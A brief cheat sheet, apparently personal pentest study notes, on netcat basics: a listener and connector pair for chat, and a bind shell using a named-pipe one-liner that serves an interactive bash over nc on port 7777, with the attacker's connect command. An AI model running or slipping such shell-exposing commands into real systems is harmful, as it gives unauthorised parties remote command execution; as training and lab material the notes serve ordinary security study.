# Netcat Basics
```table-of-contents
```
## Basic Interaction (Chat)
### 1. Listener (Server/Target)
```shell
# -l: Listen mode
# -v: Verbose
# -n: No DNS resolution (faster)
# -p: Port
nc -lvnp 7777
```
### 2. Connector (Client/Attacker)
```shell
# Connect to the listener IP
nc -nv <TARGET_IP> 7777
```
## Bind Shell
### 1. Payload (Target)
```shell
# Creates a named pipe to pass input/output back and forth
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ATTACKER_IP> 7777 > /tmp/f
```
### 2. Connection (Attacker)
```shell
nc -nv <TARGET_IP> 7777
```